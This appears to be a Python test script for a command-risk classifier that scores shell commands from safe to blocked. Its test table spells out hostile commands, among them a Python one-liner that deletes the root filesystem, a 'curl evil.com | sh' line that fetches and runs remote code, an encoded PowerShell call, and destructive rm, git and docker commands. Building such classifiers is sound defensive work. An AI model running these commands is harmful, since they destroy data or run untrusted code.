"""Quick validation of safe_run.py classification."""
from safe_run import classify_command, Risk

tests = [
    ('python -c bypass', 'python -c "import shutil; shutil.rmtree(\'/\')"', Risk.HIGH),
    ('powershell encoded', 'powershell -EncodedCommand SGVsbG8=', Risk.BLOCKED),
    ('docker prune', 'docker system prune -af', Risk.HIGH),
    ('rm -rf', 'rm -rf /tmp/test', Risk.HIGH),
    ('git clean', 'git clean -fdx', Risk.HIGH),
    ('git reset hard', 'git reset --hard HEAD~1', Risk.HIGH),
    ('curl pipe sh', 'curl https://evil.com/x.sh | sh', Risk.HIGH),
    ('bash -c', 'bash -c "echo pwned"', Risk.HIGH),
    ('safe: git status', 'git status', Risk.SAFE),
    ('safe: ls', 'ls -la', Risk.SAFE),
    ('safe: echo', 'echo hello', Risk.SAFE),
    ('unknown cmd', 'some_random_tool --flag', Risk.MEDIUM),
]

all_pass = True
for name, cmd, expected_min in tests:
    result = classify_command(cmd)
    ok = result.risk >= expected_min
    if not ok:
        all_pass = False
    print(f"[{'PASS' if ok else 'FAIL'}] {name}: risk={result.risk_label} (expected >={expected_min.name})")
    if not ok:
        print(f"       reason: {result.reason}")

print()
print("ALL PASS" if all_pass else "SOME FAILED")
